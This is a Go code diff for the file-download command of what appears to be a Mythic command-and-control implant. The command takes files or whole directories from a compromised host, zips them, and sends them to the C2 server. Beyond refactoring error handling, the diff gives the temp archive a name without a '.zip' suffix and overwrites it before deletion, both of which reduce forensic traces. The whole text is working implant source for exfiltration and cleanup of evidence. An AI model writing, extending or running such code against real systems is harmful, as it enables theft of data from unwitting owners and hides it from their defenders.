@@ -4,6 +4,7 @@ import (
 	"archive/zip"
 	"fmt"
 	"io"
+	"io/fs"
 	"os"
 	"path/filepath"
 	"strings"
@@ -31,31 +32,19 @@ func (c *DownloadCommand) Execute(task structs.Task) structs.CommandResult {
 	path := stripPathQuotes(task.Params)
 
 	if path == "" {
-		return structs.CommandResult{
-			Output:    "Error: No file path specified. Usage: download <file_path>",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: No file path specified. Usage: download <file_path>")
 	}
 
 	// Get absolute path
 	fullPath, err := filepath.Abs(path)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error resolving file path: %s", err.Error()),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error resolving file path: %s", err.Error())
 	}
 
 	// Check if path exists and whether it's a directory
 	info, err := os.Stat(fullPath)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error accessing path: %s", err.Error()),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error accessing path: %s", err.Error())
 	}
 
 	if info.IsDir() {
@@ -69,21 +58,13 @@ func (c *DownloadCommand) Execute(task structs.Task) structs.CommandResult {
 func downloadFile(task structs.Task, fullPath string) structs.CommandResult {
 	file, err := os.Open(fullPath)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error opening file: %s", err.Error()),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error opening file: %s", err.Error())
 	}
 	defer file.Close()
 
 	fi, err := file.Stat()
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error getting file info: %s", err.Error()),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error getting file info: %s", err.Error())
 	}
 
 	return sendFileToMythic(task, file, fi.Name(), fullPath)
@@ -92,46 +73,30 @@ func downloadFile(task structs.Task, fullPath string) structs.CommandResult {
 // downloadDirectory zips a directory into a temp file, downloads it, then cleans up
 func downloadDirectory(task structs.Task, dirPath string) structs.CommandResult {
 	// Create temp zip file
-	tmpFile, err := os.CreateTemp("", "*.zip")
+	tmpFile, err := os.CreateTemp("", "")
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error creating temp file: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error creating temp file: %v", err)
 	}
 	tmpPath := tmpFile.Name()
 
-	// Ensure cleanup of temp file
-	defer os.Remove(tmpPath)
+	// Ensure cleanup of temp file — overwrite before removal
+	defer secureRemove(tmpPath)
 
 	// Create zip archive of directory
 	fileCount, totalSize, zipErr := zipDirectory(tmpFile, dirPath)
 	tmpFile.Close()
 	if zipErr != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error creating zip archive: %v", zipErr),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error creating zip archive: %v", zipErr)
 	}
 
 	if fileCount == 0 {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: directory %s contains no accessible files", dirPath),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error: directory %s contains no accessible files", dirPath)
 	}
 
 	// Open the temp zip for transfer
 	zipFile, err := os.Open(tmpPath)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error opening zip for transfer: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error opening zip for transfer: %v", err)
 	}
 	defer zipFile.Close()
 
@@ -147,7 +112,7 @@ func downloadDirectory(task structs.Task, dirPath string) structs.CommandResult 
 	result := sendFileToMythic(task, zipFile, downloadName, dirPath)
 	if result.Status == "success" {
 		result.Output = fmt.Sprintf("Downloaded directory as zip: %s (%d files, %s original, %s compressed)",
-			dirPath, fileCount, statFormatSize(totalSize), statFormatSize(zipSize))
+			dirPath, fileCount, formatFileSize(totalSize), formatFileSize(zipSize))
 	}
 	return result
 }
@@ -161,7 +126,7 @@ func zipDirectory(w *os.File, dirPath string) (int, int64, error) {
 	var totalSize int64
 	const maxDepth = 10
 
-	err := filepath.Walk(dirPath, func(path string, info os.FileInfo, walkErr error) error {
+	err := filepath.WalkDir(dirPath, func(path string, d fs.DirEntry, walkErr error) error {
 		if walkErr != nil {
 			return nil // skip inaccessible entries
 		}
@@ -174,19 +139,24 @@ func zipDirectory(w *os.File, dirPath string) (int, int64, error) {
 		// Check depth
 		depth := len(strings.Split(relPath, string(os.PathSeparator)))
 		if depth > maxDepth {
-			if info.IsDir() {
+			if d.IsDir() {
 				return filepath.SkipDir
 			}
 			return nil
 		}
 
 		// Skip directories (created implicitly by file paths)
-		if info.IsDir() {
+		if d.IsDir() {
 			return nil
 		}
 
 		// Skip symlinks
-		if info.Mode()&os.ModeSymlink != 0 {
+		if d.Type()&os.ModeSymlink != 0 {
+			return nil
+		}
+
+		info, infoErr := d.Info()
+		if infoErr != nil {
 			return nil
 		}
 
@@ -246,18 +216,10 @@ func sendFileToMythic(task structs.Task, file *os.File, fileName, fullPath strin
 	for {
 		select {
 		case <-downloadMsg.FinishedTransfer:
-			return structs.CommandResult{
-				Output:    "Finished Downloading",
-				Status:    "success",
-				Completed: true,
-			}
+			return successResult("Finished Downloading")
 		case <-time.After(1 * time.Second):
 			if task.DidStop() {
-				return structs.CommandResult{
-					Output:    "Tasked to stop early",
-					Status:    "error",
-					Completed: true,
-				}
+				return errorResult("Tasked to stop early")
 			}
 		}
 	}
